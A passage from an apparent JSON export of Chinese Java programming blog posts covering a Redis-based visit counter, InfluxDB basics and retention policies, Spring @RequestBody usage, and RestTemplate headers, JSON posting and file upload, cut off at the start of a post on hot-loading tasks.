request.getHeader(\"X-Real-IP\"); String XFor = request.getHeader(\"X-Forwarded-For\"); if(StringUtils.isNotEmpty(XFor) &amp;&amp; !\"unKnown\".equalsIgnoreCase(XFor)){ //多次反向代理后会有多个ip值，第一个ip才是真实ip int index = XFor.indexOf(\",\"); if(index != -1){ return XFor.substring(0,index); }else{ return XFor; } } XFor = Xip; if(StringUtils.isNotEmpty(XFor) &amp;&amp; !\"unKnown\".equalsIgnoreCase(XFor)){ return XFor; } if (StringUtils.isBlank(XFor) || \"unknown\".equalsIgnoreCase(XFor)) { XFor = request.getHeader(\"Proxy-Client-IP\"); } if (StringUtils.isBlank(XFor) || \"unknown\".equalsIgnoreCase(XFor)) { XFor = request.getHeader(\"WL-Proxy-Client-IP\"); } if (StringUtils.isBlank(XFor) || \"unknown\".equalsIgnoreCase(XFor)) { XFor = request.getHeader(\"HTTP_CLIENT_IP\"); } if (StringUtils.isBlank(XFor) || \"unknown\".equalsIgnoreCase(XFor)) { XFor = request.getHeader(\"HTTP_X_FORWARDED_FOR\"); } if (StringUtils.isBlank(XFor) || \"unknown\".equalsIgnoreCase(XFor)) { XFor = request.getRemoteAddr(); } return XFor;} 2. Redis操作接下来就是redis数据结果的操作了，关于Spring中如何配置和简单使用RedisTemplate可以参考 《180611-Spring之RedisTemplate配置与使用》 下面简单贴一下核心的Redis操作代码, 关于Hash的访问就没啥好说的，参考上一篇博文即可 123456789101112131415161718192021222324252627282930313233343536373839404142/** * 获取redis中指定value的score * * @param key 唯一key * @param value 存在redis中的实际值（计数组件中value即为客户端IP) * @return */public static Long zScore(String key, String value) { return template.execute((RedisCallback&lt;Long&gt;) con -&gt; { Double ans = con.zScore(toBytes(key), toBytes(value)); return ans == null ? 0 : ans.longValue(); });}/** * 表示新增一条记录 * * @param key * @param value 对应客户端ip * @param score 对应客户端访问的排名 * @return 当set中没有记录时，返回true；否则返回false */public static Boolean zAdd(String key, String value, long score) { return template.execute((RedisCallback&lt;Boolean&gt;) con -&gt; con.zAdd(toBytes(key), score, toBytes(value)));}/** * 获取zset中最大的score，即在计数组件中，这个值就是总得访问人数 * @param key * @return */public static Long zMaxScore(String key) { return template.execute((RedisCallback&lt;Long&gt;) con -&gt; { Set&lt;RedisZSetCommands.Tuple&gt; set = con.zRangeWithScores(toBytes(key), -1, -1); if (CollectionUtils.isEmpty(set)) { return 0L; } Double score = set.stream().findFirst().get().getScore(); return score.longValue(); });} 主要的redis操作是上面三个方法，那么怎么调用的呢？直接看下面的逻辑即可，比较清晰 获取站点的总访问人数 尝试获取访问者的排名 如果没有获取到排名，表示首次访问，则需要新插入一条记录 获取到排名，则直接返回 12345678910111213141516public CountDTO visit(String appKey, String url) { String visitKey = visitKey(appKey); // 首先是获取站点的总访问人数 long visitTotalNum = QuickRedisClient.zMaxScore(visitKey); // 获取访问者在总访问人数中的排名，如果为0，表示该用户没有访问过 long visitIndex = QuickRedisClient.zScore(visitKey, ReqInfoContext.getReqInfo().getClientIp()); if (visitIndex == 0) { // 不存在（即用户没有访问过），则需要添加一条访问记录 visitTotalNum += 1; visitIndex = visitTotalNum; QuickRedisClient.zAdd(visitKey, ReqInfoContext.getReqInfo().getClientIp(), visitIndex); } // 构建DO对象} 看到上面这一段逻辑的实现，如果一点疑问都没有，那我不得不怀疑是否真的看了这篇博文了，或者说就是单纯的看了而已，却没有一点的收货 重点说明，上面的实现有并发问题、并发问题、并发问题，重要的事情说三遍，至于为什么以及该如何解决，欢迎讨论 III. 其他0. 相关博文 180626-Spring之借助Redis设计一个简单访问计数器 180611-Spring之RedisTemplate配置与使用 Redis实现分布式锁相关注意事项 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注","link":"/hexblog/2018/07/13/180713-Spring之借助Redis设计访问计数器之扩展篇/"},{"title":"180726-InfluxDB基本概念小结","text":"InfluxDB基本概念小结InfluxDB作为时序数据库，与传统的关系型数据库相比而言，还是有一些区别的，下面尽量以简单明了的方式介绍下相关的术语概念 I. 基本概念 mysql influxdb 说明 database database 数据库 table measurement 类似mysql中表的概念 record tag + field + timestamp 传统表中的一行数据，映射到influxdb中，可以划分为三个 1. database数据库，和mysql的数据库相比，没有太大的歧义 2. measurement对比的是mysql中的table，从实际体验来看，两个之间最明显的区别在于没有单独的创建measurement的方法，直接新增一条数据时，若measurement不存在，则直接创建并插入一条数据 3. Point这个对比的是mysql中的record，在influxDB中，表示每个表中，某个时刻，满足某个条件的filed数据（简单来说就是 timestamp + tag + filed)的组成一个point timestamp : 时间戳，ns单位，每个记录都必然有这个属性，没有显示添加时，默认给一个 tag: 标签，kv结构，在database中， tag + measurement 一起构建索引 参与索引创建，因此适合作为查询的过滤条件 tag的数据量不要太多，最好能有典型的辨别性（和mysql的建立索引的原则差不多） value为String类型 tag是可选的，在measurement不设置tag也是ok的 field：存储数据，kv结构 数据类型为: long, String, boolean, float 4. SeriesSeries: tag key 与tag value的唯一组合 II. 实例分析上面几个为基本的概念，单独的看起来印象不够深刻，下面结合实例进行说明： 建立一个measurement,保存某个应用的性能状况，包含以下指标, 每秒写一次数据到influxDB中 服务机器: host=127.0.0.1 服务接口: service=app.service.index qps: qps=1340 rt: 1313 cpu: 45.23 mem: 4154m load: 1.21 1. measurement创建上面有7个指标参数，第一步就是区分tag和field，前面说到tag会建索引，推荐用于可以区分类型，取值可以预估的字段，所以对上面进行如下区分 tag host servie field qps rt cpu mem load 一条实际的插入数据如 123456&gt; insert myapp,host=127.0.0.1,service=app.service.index qps=1340,rt=1313,cpu=45.23,mem=\"4145m\",load=1.21&gt; select * from myappname: myapptime cpu host load mem qps rt service---- --- ---- ---- --- --- -- -------1532597158613778583 45.23 127.0.0.1 1.21 4145m 1340 1313 app.service.index a. 小结说明 在insert执行语句中，tag与tag、field与field之间用都好进行分割，tag与field之间用空格分割 tag的value都是，String类型，不需要加双引号 field的String类型数据，需要放在双引号中，否则会报错 如果需要显示添加时间戳，在filed后添加空格，再添加时间戳 b. 是否可以没有field实测不行，输出如下 12&gt; insert myabb,host=123,service=indexERR: {\"error\":\"unable to parse 'myabb,host=123,service=index ': invalid field format\"} 是否可以没有tag根据前面的说明已经实测，可以 123456&gt; insert myabb qps=123,rt=1231&gt; select * from myabbname: myabbtime qps rt---- --- --1532597385053030634 123 1231 2. 数据分析新插入几条数据，目前的数据为 12345678&gt; select * from myappname: myapptime cpu host load mem qps rt service---- --- ---- ---- --- --- -- -------1532597158613778583 45.23 127.0.0.1 1.21 4145m 1340 1313 app.service.index1532597501578551929 45.23 127.0.0.1 1.21 4145m 1341 1312 app.service.index1532597510225918132 45.23 127.0.0.1 1.21 4145m 1341 1312 app.service.about1532597552421996033 45.23 127.0.0.2 1.21 4145m 1341 1312 app.service.about a. series上面四条数据，对应几个series呢 ？ 根据前面的说法，tagKey + tagValue 确定给一个series （实际上是 measurement + retention policy + tags来确定)，因此上表总共有三个series 127.0.0.1 | app.service.index 127.0.0.1 | app.service.about 127.0.0.2 | app.service.about 那么这个series到底是什么东西呢？ 如果将上面的数据图表化的方式显示出来，我们可以怎么办？ 首先我们确定好应用及其和服务名，然后查看这个服务在这台机器上，在时间线上的服务性能 翻译过来就是，将cpu/service作为检索条件，以time为时间轴，将value(cpu,load,mem,qps,rt)映射到二维坐标上作为一个点（point），然后将所有的point连接成线，最终得到连续的图表 所以series就是上面的检索条件，同时point的概念也容易理解了 III. 保留策略前面是表数据的相关基础概念，这里还有一个就是数据保存的策略 retention policy, 用于决定数据保存多久（意思是数据可以删除），保存几个备份，集群的处理等 1. 基本说明influxdb面向大数据的时序数据库，所以数据量可以很大很大，如果全部存储，估计硬盘的费用都不小，而且有些数据可能并不需要永久存储，因此就有了这个rentention policy InfluxDB本身不提供数据的删除操作，因此用来控制数据量的方式就是定义数据保留策略。 因此定义数据保留策略的目的是让InfluxDB能够知道可以丢弃哪些数据，从而更高效的处理数据。 2. 基本操作a. 查询策略1234&gt; show retention policies on hh_testname duration shardGroupDuration replicaN default---- -------- ------------------ -------- -------autogen 0s 168h0m0s 1 true name: 名称 duration: 保留时间, 0表示永久保存 shardGroupDuration: shardGroup的存储时间，shardGroup是InfluxDB的一个基本储存结构，应该大于这个时间的数据在查询效率上应该有所降低。 replicaN: 全称是REPLICATION，副本个数 default: 是否是默认策略 b. 新建策略123456&gt; create retention policy \"2_hour\" on hh_test duration 2h replication 1 default&gt; show retention policies on hh_testname duration shardGroupDuration replicaN default---- -------- ------------------ -------- -------autogen 0s 168h0m0s 1 false2_hour 2h0m0s 1h0m0s 1 true c. 修改策略123456&gt; alter retention policy \"2_hour\" on hh_test duration 4h default&gt; show retention policies on hh_testname duration shardGroupDuration replicaN default---- -------- ------------------ -------- -------autogen 0s 168h0m0s 1 false2_hour 4h0m0s 1h0m0s 1 true d. 删除策略12345&gt; drop retention policy \"2_hour\" on hh_test&gt; show retention policies on hh_testname duration shardGroupDuration replicaN default---- -------- ------------------ -------- -------autogen 0s 168h0m0s 1 false 删除默认策略之后，就没有默认策略了，是否会有问题呢？ 3. RP理解设置这个策略之后，会自动删除过期的数据，那么数据时怎么保存的呢？ 比如默认的永久保存策略中，有个 shardGroupDuration 参数，为7天，也就是说7天的数据放在一个Shard中，过了之后，新加一个Shard shard包含实际的编码和压缩数据，并由磁盘上的TSM文件表示。 每个shard都属于唯一的一个shard group。多个shard可能存在于单个shard group中。每个shard包含一组特定的series。给定shard group中的给定series上的所有点将存储在磁盘上的相同shard（TSM文件）中。 IV. 其他1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/07/26/180726-InfluxDB基本概念小结/"},{"title":"180730-Spring之RequestBody的使用姿势小结","text":"Spring之RequestBody的使用姿势小结SpringMVC中处理请求参数有好几种不同的方式，如我们常见的下面几种 根据 HttpServletRequest 对象获取 根据 @PathVariable 注解获取url参数 根据 @RequestParam 注解获取请求参数 根据Bean的方式获取请求参数 根据 @ModelAttribute 注解获取请求参数 对上面几种方式有兴趣的可以看一下这篇博文: SpringMVC之请求参数的获取方式 除了上面的几种方式之外，还有一种 @RequestBody 的使用方式，本文则主要介绍这种传参的使用姿势和相关注意事项 I. 使用姿势1. 服务接口借助Spring框架，使用@RequestBody并没有什么难度，很简单的就可以写一个使用case出来，如下 1234567891011121314151617@Slf4j@RestControllerpublic class ReqBodyController { @Data @NoArgsConstructor @AllArgsConstructor public static class Req { private String key; private Integer size; } @RequestMapping(value = \"/body\", method = {RequestMethod.POST, RequestMethod.GET, RequestMethod.OPTIONS}) public BaseRsp body(@RequestBody Req req) { log.info(\"req: {}\", req); return new BaseRsp&lt;&gt;(req); }} 看上面的实现，和我们通常的写法并无差别，无非是将以前的 @RequsetParam 注解换成 @RequsetBody 注解，而且这个注解内部只有一个filed，比RequsetParam还少 1234567@Target({ElementType.PARAMETER})@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface RequestBody { // 默认参数必须存在，否则会抛一个异常 boolean required() default true; } 看到上面的实现，估计也可以猜出，这个注解对于后端而言，写没啥问题，关键是如何用（具体来讲是如何给前端用） 2. 接口调用上面写完了，接下来的重点就是如何使用了，在使用之前，有必要了解下 RequestBody 这个注解出现的原有以及应用场景（换句话说它和RequestParam有什么区别，为什么要单独的搞一个这个东西出来） RequestBody @requestBody注解常用来处理content-type不是默认的application/x-www-form-urlcoded编码的内容，比如说：application/json或者是application/xml等。一般情况下来说常用其来处理application/json类型。 a. content-type定义在进入下一步之前，有必要说一下Content-Type这个http请求头的作用了，下面一段来自其他博文，原文链接见最后 MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。 常见媒体格式如下: text/html ： HTML格式 text/plain ：纯文本格式 text/xml ： XML格式 image/gif ：gif图片格式 image/jpeg ：jpg图片格式 image/png：png图片格式 以application开头的媒体格式类型： application/xhtml+xml ：XHTML格式 application/xml ： XML数据格式 application/atom+xml ：Atom XML聚合格式 application/json ： JSON数据格式 application/pdf ：pdf格式 application/msword ： Word文档格式 application/octet-stream ： 二进制流数据（如常见的文件下载） application/x-www-form-urlencoded ： 中默认的encType，form表单数据被编码为key/value格式发送到服务器（表单默认的提交数据的格式） b. content-type 实例说明上面算是基本定义和取值，下面结合实例对典型的几种方式进行说明 application/x-www-form-urlencoded：数据被编码为名称/值对。这是标准的编码格式。 multipart/form-data： 数据被编码为一条消息，页上的每个控件对应消息中的一个部分。 text/plain： 数据以纯文本形式(text/json/xml/html)进行编码，其中不含任何控件或格式字符 对于前端使用而言，form表单的enctype属性为编码方式，常用有两种：application/x-www-form-urlencoded和multipart/form-data，默认为application/x-www-form-urlencoded。 Get请求 发起Get请求时，浏览器用application/x-www-form-urlencoded方式，将表单数据转换成一个字符串(key1=value1&amp;key2=value2…)拼接到url上，这就是我们常见的url带请求参数的情况 Post表单 发起post请求时，如果没有传文件，浏览器也是将form表单的数据封装成k=v的结果丢到http body中，拿开源中国的博客提交的表单为例，一个典型的post表单，上传的数据拼装在form data中，为kv结构 如果有传文件的场景，Content-Type类型会升级为multipart/form-data，这一块不详细展开，后面有机会再说 Post json串 post表单除了前面一种方式之外，还有一种也是我们常见的，就是讲所有的表单数据放在一个大的json串中，然后丢给后端，这里也有一个在线的实例，某电商平台的商品发表，截图如下 注意看上面的Request Payload，是一个大的json串，和前面差别明显 c. RequestBody请求根据RequestBody的定义，要想访问前面定义的那个接口，使用传统的表单传递方式是不行的，curl命令测试如下 1curl -X POST -d 'key=haha&amp;size=123' http://127.0.0.1:19533/body 后端对应的输出如下（抛了一个异常，表示@RequestBody注解修饰rest接口，不支持 Content type 'application/x-www-form-urlencoded;charset=UTF-8' 因此使用姿势需要显示添加请求头，传参也改变一下 1curl -l -H \"Content-type: application/json\" -X GET -d '{\"key\": \"!23\", \"size\": 10}' http://127.0.0.1:19533/body 返回结果如下 3. 注意事项a. content-type显示指定根据前面的说明，可以知道 @RequestBody 这个注解的使用，使得REST接口接收的不再content-type为application/x-www-form-urlencoded的请求, 反而需要显示指定为application/json b. 请求方法RequestBody支持GET方法么？前面都是采用post提交参数，如果改成GET会怎样？ curl测试方式 1curl -l -H \"Content-type: application/json\" -X GET -d '{\"key\": \"!23\", \"size\": 10}' http://127.0.0.1:19533/body\\?key\\=app 对应的后端debug截图如下，发现使用GET方式，并没有问题，依然可以获取到参数 换成大名鼎鼎的POSTMAN来测试 使用post方法请求时，截图如下，主要就是修改header的content-type，然后在body中添加json串格式的请求 然而改成get之后，body都直接灰掉了，也就是它不支持在get请求时，提交Body数据 url请求方式 接下来直接换成url的请求方式，看是否直接支持get请求 1http://127.0.0.1:19533/body?{&quot;key&quot;: &quot;!23&quot;, &quot;size&quot;: 10} 浏览器中输入时，服务器400, 换成curl方式请求，抛的是缺少RequestBody的异常，也就是说，将json串拼接到url中貌似不行（也有可能是我的使用姿势不对。。。） 小结 到这里小结一下，使用RequestBody获取参数时，还是老老实实的选择POST方法比较合适，至于原因，跟大众，随主流，跟着大家的习惯走比较好 c. 参数获取这个主要就是后端编写接口时，获取RequestBody参数的问题了，通过测试，发现在HttpServletRequest参数中，居然拿不到提交的RequestBody参数，演示如下 请求url为 1curl -l -H \"Content-type: application/json\" -X POST -d '{\"key\": \"!23\", \"size\": 10}' http://127.0.0.1:19533/body\\?url\\=ddd 对应的debug截图如下，url参数可以拿到，RequestBody参数没有 首先声明，下面的这段分析，没有看源码，纯属于个人推断，如有问题，对被误导的朋友表示歉意，也希望对此有了解的朋友，多多批评指正 从传文件的思路出发，前端传文件给后端时，后端是基于流的方式，将上传的二进制流，写入到`MultipartFile`；而二进制流读完之后，没法再重复的读 RequestBody可能也是这么个逻辑，首先是从HttpServletRequest的Reader流中读取body参数并封装到上面的req对象，而不会像url参数一样，写回到`javax.servlet.ServletRequest#getParameterMap` 对上面的猜测做一个小小的验证，改成直接从HttpServletRequest的Reader流中获取请求body参数 12345678910111213141516@RequestMapping(value = \"/body\", method = {RequestMethod.POST, RequestMethod.GET, RequestMethod.OPTIONS})public BaseRsp body(HttpServletRequest request) throws IOException { BufferedReader reader = request.getReader(); StringBuilder builder = new StringBuilder(); String line = reader.readLine(); while (line != null) { builder.append(line); line = reader.readLine(); } reader.close(); String reqBody = builder.toString(); Req req = JSON.parseObject(reqBody, Req.class); log.info(\"req: {}, request: {}\", req, request.getParameterMap()); return new BaseRsp&lt;&gt;(req);} 验证如下 其实到这里，有个有意思的地方已经引起了我的好奇，那就是在Spring容器中HttpServletRequest这个东西，是怎么运转的，后面有机会再聊，此处不展开… 4. 小结 ReuqestBody 主要是处理json串格式的请求参数，要求使用方指定header content-type:application/json RequestBody 通常要求调用方使用post请求 RequsetBody参数，不会放在HttpServletRequest的Map中，因此没法通过javax.servlet.ServletRequest#getParameter获取 II. 其他0. 参考 SpringMVC之请求参数的获取方式 Http中Content-Type的详解 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/07/30/180730-Spring之RequestBody的使用姿势小结/"},{"title":"180815-Spring之RestTemplate使用小结二：中级使用篇","text":"Spring之RestTemplate中级使用篇前面一篇介绍了如何使用RestTemplate发起post和get请求，然而也只能满足一些基本的场景，对于一些特殊的如需要设置请求头，添加认证信息等场景，却没有提及可以怎么做，这一篇则相当于进阶版，将主要介绍 get/post请求如何携带 header post传文件可以怎么玩, post提交json串怎么处理 exchange方法的使用姿势 I. 请求头设置首先一个问题就是为什么要设置请求头？ 我们通过浏览器正常访问的接口，可能通过代码直接访问时，就会提示403 而这样的原因，较多的一个可能就是后端的请求做了限制，比如根据请求的agent,判断是否为爬虫；根据referer判断是否要返回数据等等；而后端进行校验的条件中，往往会拿请求头的数据，因此这也就要求我们在使用时，主动的塞入一些请求头信息 1. Get请求直接看RestTemplate提供的几个Get请求接口，并没有发现有设置请求头的地方，是不是就表明没法设置请求头了？ 答案档案是能设置了,具体的使用思路有点类似mvc中的拦截器，自定义一个拦截器，然后在你实际发起请求时，拦截并设置request的请求头 注意到 RestTemplate 的父类InterceptingHttpAccessor提供了一个接收Interceptor的接口org.springframework.http.client.support.InterceptingHttpAccessor#setInterceptors，这个就是我们所需要的关键点（讲道理，除非事先就知道有这么个玩意，不然真让你去找，还不一定能找到） 所以第一步就是写一个ClientHttpRequestInterceptor类，添加请求头 12345678910public class UserAgentInterceptor implements ClientHttpRequestInterceptor { @Override public ClientHttpResponse intercept(HttpRequest request, byte[] body, ClientHttpRequestExecution execution) throws IOException { HttpHeaders headers = request.getHeaders(); headers.add(HttpHeaders.USER_AGENT, \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\"); return execution.execute(request, body); }} 下一步就是在创建RestTemplate对象之后，声明解释器并测试使用了 12345678@Testpublic void testGetHeader() { String url = \"http://localhost:8080/agent?name=一灰灰Blog\"; RestTemplate restTemplate = new RestTemplate(); restTemplate.setInterceptors(Collections.singletonList(new UserAgentInterceptor())); ResponseEntity&lt;String&gt; response = restTemplate.getForEntity(url, String.class); System.out.println(response.getStatusCode() + \" | \" + response.getBody());} 首先在测试之前，先搭一个服务，简单判断agent，不满足条件的直接403， 后端mock代码如下 12345678910@ResponseBody@RequestMapping(path = \"agent\")public String agent(HttpServletRequest request, HttpServletResponse response, @RequestParam(value = \"name\", required = false) String name) throws IOException { String agent = request.getHeader(HttpHeaders.USER_AGENT); if (StringUtils.isEmpty(agent) || !agent.contains(\"WebKit\")) { response.sendError(403, \" illegal agent \"); } return \"welcome \" + name;} 上面执行后输出如下，添加请求头后正常返回 当然也需要对比下不设置agent的情况了，直接抛了一个异常出来了（说明，不显示覆盖User-Agent时，后端接收到的agent为: Java/1.8.0_171 上面虽然只给了设置User-Agent的例子，但是其他的请求头，都是可以放在自定义的Interceptor中添加进去的 2. Post请求当然get请求使用的这种姿势，对于post而言或者对于其他的http请求方法而言，都是通用的，而对于post请求来说，还有另外一种方式，就是requset参数，可以携带request headers 首先mock一个后端接口 12345678910111213@ResponseBody@RequestMapping(path = \"post\", method = {RequestMethod.GET, RequestMethod.OPTIONS, RequestMethod.POST}, produces = \"charset/utf8\")public String post(HttpServletRequest request, HttpServletResponse response, @RequestParam(value = \"email\", required = false) String email, @RequestParam(value = \"nick\", required = false) String nick) throws IOException { String agent = request.getHeader(HttpHeaders.USER_AGENT); if (StringUtils.isEmpty(agent) || !agent.contains(\"WebKit\")) { response.sendError(403, \" illegal agent \"); return null; } return \"success email=\" + email + \"&amp;nick=\" + URLEncoder.encode(nick, \"UTF-8\") + \"&amp;status=success\";} 简单的使用姿势如下 12345678910111213141516171819@Testpublic void testPostHeader() { String url = \"http://localhost:8080/post\"; String email = \"test@hhui.top\"; String nick = \"一灰灰Blog\"; MultiValueMap&lt;String, String&gt; params = new LinkedMultiValueMap&lt;&gt;(); params.add(\"email\", email); params.add(\"nick\", nick); HttpHeaders headers = new HttpHeaders(); headers.add(HttpHeaders.USER_AGENT, \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) \" + \"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\"); HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt; request = new HttpEntity&lt;&gt;(params, headers); RestTemplate restTemplate = new RestTemplate(); ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(url, request, String.class); System.out.println(response.getStatusCode() + \" | \" + response.getBody());} 从上面代码可以看出，具体的使用姿势相比于不添加请求头时，只是多了一个封装 具体的header信息分装到 HttpHeaders 对象中 请求参数依然封装到 MultiValueMap 中 然后根据请求头 + 请求参数，构建 HttpEntity 对象，将这个作为post的请求request参数传入 当然作为对比，当不加入headers时，看下返回什么鬼， 406异常，但是我们后端定义的是403，为什么会返回406呢？ 3. exchange 方式另外还会关注到RestTemplate还提供了一个exchange方法，这个相当于一个公共的请求模板，使用姿势和get/post没有什么区别，只是可以由调用发自己来选择具体的请求方法 使用exchange对上面的post请求进行简单的替换如下, 基本上除了多一个参数之外没有什么区别了 12345678910111213141516171819@Testpublic void testPostHeader() { String url = \"http://localhost:8080/post\"; String email = \"test@hhui.top\"; String nick = \"一灰灰Blog\"; MultiValueMap&lt;String, String&gt; params = new LinkedMultiValueMap&lt;&gt;(); params.add(\"email\", email); params.add(\"nick\", nick); HttpHeaders headers = new HttpHeaders(); headers.add(HttpHeaders.USER_AGENT, \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) \" + \"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\"); HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt; request = new HttpEntity&lt;&gt;(params, headers); RestTemplate restTemplate = new RestTemplate(); ResponseEntity&lt;String&gt; response = restTemplate.exchange(url, HttpMethod.POST, request, String.class); System.out.println(response.getStatusCode() + \" | \" + response.getBody());} 那么问题来了，为什么要有这个东西？或者说这个接口的提供可以带来什么好处？ 当你写一个公共的Rest工具类时，就比较方便了，底层统一，具体的方法由上层业务方选择即可 get可以通过这种方式直接添加请求头（也就是不需要第一种case中的自定义拦截器来塞入header，显然更加灵活） II. Post参数提交前面的post参数提交，其实默认采用的是 application/x-www-form-urlencoded 方式，即是我们最常见的表单提交方式，在浏览器中的表现形式如下 此外，还有一种直接提交json串的方式，在前文 《180730-Spring之RequestBody的使用姿势小结》中有说明，具体浏览器中表现形式为 所以接下来的问题就是，RestTemplate要怎么处理呢？ 1. json串提交建议在看下面的内容之前，先看一下上面的那篇博文，理解下RequestBody是什么东西 首先搭建一个后端 12345678910111213@Data@NoArgsConstructor@AllArgsConstructorpublic static class Req { private String key; private Integer size;}@ResponseBody@RequestMapping(value = \"/body\", method = {RequestMethod.POST, RequestMethod.GET, RequestMethod.OPTIONS})public String body(@RequestBody Req req) { return req.toString();} 然后使用方式，无非就是在请求头中添加下Content-Type为Application/json 123456789101112131415161718@Testpublic void testPostRequestBody() { String url = \"http://localhost:8080/body\"; String email = \"test@hhui.top\"; String nick = \"一灰灰Blog\"; Map&lt;String, String&gt; params = new HashMap&lt;&gt;(); params.put(\"email\", email); params.put(\"nick\", nick); HttpHeaders headers = new HttpHeaders(); headers.add(HttpHeaders.CONTENT_TYPE, \"application/json\"); HttpEntity&lt;Map&lt;String, String&gt;&gt; request = new HttpEntity&lt;&gt;(params, headers); RestTemplate restTemplate = new RestTemplate(); ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(url, request, String.class); System.out.println(response.getStatusCode() + \" | \" + response.getBody());} 注意下post参数，是放在Map容器中，而不是之前的MultiValueMap 运行时截图如下 2. 文件上传post除了传表单数据（json串）之外，还有一个常见的就是上传文件了，实际上使用RestTemplate来实现文件上传，算是比较简单的了，和前面的使用基本上也没有什么差别，只是将文件作为params参数而已 首先搭建一个Controller后端服务，简单的获取文件内容，并返回 123456789101112131415161718@ResponseBody@PostMapping(path = \"file\")public String file(MultipartHttpServletRequest request) throws IOException { MultipartFile file = request.getFile(\"file\"); if (file == null) { return \"no file!\"; } BufferedReader reader = new BufferedReader(new InputStreamReader(file.getInputStream())); StringBuilder builder = new StringBuilder(); String line = reader.readLine(); while (line != null) { builder.append(line); line = reader.readLine(); } reader.close(); return builder.toString();} 然后就是实际的测试用例，将文件包装在FileSystemResource对象中，然后塞入MultiValueMap中，注意下面的使用并没有显示添加请求头，而这种时候，content-type 通过断点查看实际为 content-type = multipart/form-data; 123456789101112@Testpublic void testPostFile() { String url = \"http://localhost:8080/file\"; FileSystemResource resource = new FileSystemResource(new File(\"/tmp/test.txt\")); MultiValueMap&lt;String, Object&gt; params = new LinkedMultiValueMap&lt;&gt;(); params.add(\"file\", resource); params.add(\"fileName\", \"test.txt\"); RestTemplate restTemplate = new RestTemplate(); ResponseEntity&lt;String&gt; response = restTemplate.postForEntity(url, params, String.class); System.out.println(response);} III. 小结本篇主要介绍如何给RestTemplate发起的请求，添加请求头，以及完成某些特定的请求，下面小结一下使用姿势 1. 设置header两种方式 一个是设置Interceptors，在拦截器中主动添加上对应的请求头即可，适用于为所有的请求添加统一的请求头的场景 这种方式不仅仅能用来设置请求头，还可以在其中做很多其他的事情 另外一种方式针对 postForXXX 和 exchange 两种请求方式而言，同样自己设置请求头HttpHeader，然后将请求头和params封装到HttpEntity,作为request参数提交即可 2. 特殊的请求方式json串的提交 设置请求头的content-type为 Applicaiton/json 将请求的数据封装到map容器内（或者直接定义一个请求参数的DTO对象也可以） 然后将header和参数封装到 HttpEntity 中，发起请求即可 文件上传 将资源文件塞入到MultiValueMap中即可，和普通的请求方式没有什么区别 3. 其他初级篇介绍了如何使用RestTemplate发起简单的GET/POST请求； 中级篇则介绍请求的过程中添加设置请求头，以及某些特殊的请求可以怎么处理 显然还会有高级篇，除了上面的东西，我们还需要知道些什么呢？ 请求超时的设置比较实用，有必要了解下 在访问某些特殊的网站时，代理的设置也避不开 请求有身份鉴权的情况下，如何安全的携带自己的身份呢？ RestTemplate底层使用的是什么网络库做的网络访问？可以用其他的进行替换么？（答案肯定是可以，不然这个命名就标准的名不副实了） 关于高级篇，坐等更新 IV. 其他0. 相关博文 180813-Spring之RestTemplate初级使用篇 180730-Spring之RequestBody的使用姿势小结 1. 一灰灰Blog： https://liuyueyi.github.io/hexblog一灰灰的个人博客，记录所有学习和工作中的博文，欢迎大家前去逛逛 2. 声明尽信书则不如，已上内容，纯属一家之言，因个人能力有限，难免有疏漏和错误之处，如发现bug或者有更好的建议，欢迎批评指正，不吝感激 微博地址: 小灰灰Blog QQ： 一灰灰/3302797840 3. 扫描关注一灰灰blog 知识星球","link":"/hexblog/2018/08/15/180815-Spring之RestTemplate使用小结二：中级使用篇/"},{"title":"180729-Quick-Task 动态脚本支持框架之任务动态加载","text":"Quick-Task 动态脚本支持框架之任务动态加载前面几篇博文分别介绍了整个项目的基本架构，使用说明，以及整体框架的设计与实现初稿，接下来则进入更细节的实现篇，将整个工程中核心实现捞出来，从为什么这么设计到最终的实现给予说明 相关系列博文： 180702-QuickTask动态脚本支持框架整体介绍篇 180719-Quick-Task 动态脚本支持框架之使用介绍篇 180723-Quick-Task 动态脚本支持框架之结构设计篇 I. 任务动态加载这个动态脚本调度框架，最大的一个功能点就是支持热加载了，何为热加载？ 简单来说就是在程序不宕机的情况下，可以往里面添加新的任务，删除旧的任务，更新已有的任务等等，就好比飞机在天上飞的时候给它加油，就这么高端的操作（😊） 为了支持热加载，首先面临的问题就是如何判断有任务的新增/删除/修改？ 1. 任务监听的从0到1要实现任务变更的监听，自然而然想到的一个方案就是起一个线程，不断的轮询，基本的逻辑无非是判断是否有任务的变更发生而已，也因此关注点就落在了如何判断任务是否有变更了 最简单粗暴直观的方法，就是记录之前的所有的任务，然后每次轮询时判断当前的所有任务与之前的所有任务是否有区别 再落到具体的实现上，则与任务的具体存储有关系了。很容易想到了几种任务存储方式有 